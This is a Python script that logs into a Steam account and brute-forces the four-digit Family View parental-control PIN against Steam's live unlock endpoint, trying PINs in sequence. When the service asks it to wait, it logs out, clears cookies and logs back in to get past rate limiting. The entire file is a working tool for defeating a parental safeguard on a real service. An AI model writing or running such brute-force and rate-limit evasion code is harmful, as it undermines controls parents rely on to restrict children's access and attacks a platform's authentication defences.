import requests
import time
import re
import execjs
import json

req = requests.session()
headers = {
        'Referer': 'https://store.steampowered.com/parental/blocked',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 Edg/99.0.1150.30',
    }

def bomb(username, password):
    dologin(username, password)
    sessionID = getSessionID()
    for pin in range(5200, 10000):
        data = {
            'pin': "%04d"%pin,
            'sessionid' : sessionID
        }
        try:
            r = req.post('https://store.steampowered.com/parental/ajaxunlock', data=data, headers = headers)
            rjson = json.loads(r.text)
            if rjson['success'] == False:
                if 'wait' in rjson['error_message']:
                    print('wait a while')
                    req.post('https://store.steampowered.com/logout/',data=data, headers = headers)
                    req.cookies.clear()
                    dologin(username, password)
                    sessionID = getSessionID()
                    time.sleep(180)
                else:
                    print("PIN: %04d: %s" % (pin, rjson['error_message']))
            else:
                print("PIN: %04d: find it" % pin)
                exit(0)
        except BaseException as e:
            print('wrong, try again')
            dologin(username, password)
            sessionID = getSessionID()
            time.sleep(10)


def encodePassword(password, pub_exp, pub_mod):
    with open('rsa.js', encoding='utf-8') as f:
        jsdata = f.read()
    passencrypt = execjs.compile(jsdata).call('encodePassword', password, pub_mod, pub_exp)
    return(passencrypt)


def dologin(username, password):
    keys = getrsakey(username)
    pub_mod = keys['publickey_mod']
    pub_exp = keys['publickey_exp']
    encryptedPassword = encodePassword(password, pub_exp, pub_mod)
    data = {
        'password' : encryptedPassword,
        'username' : username,
        'rsatimestamp' : keys['timestamp']
    }
    r = req.post('https://store.steampowered.com/login/dologin/', data=data)
    rjson = json.loads(r.text)
    if rjson['success']:
        print('login success')
    else:
        print('login fail')
    pass


def getrsakey(username):
    data = {
        'donotcache' : int(time.time()),
        'username' : username
    }
    r = req.post('https://store.steampowered.com/login/getrsakey/', data=data)
    rjson = json.loads(r.text)
    return rjson

def getSessionID():
    r = req.get('https://store.steampowered.com/actions/GetNotificationCounts')
    # print(str(r.cookies))
    sessionID = re.findall('sessionid=(\w+)', str(r.cookies))[0]
    return sessionID 

if __name__ == '__main__':
    username = input('account:')
    password = input('password:')
    bomb(username, password)
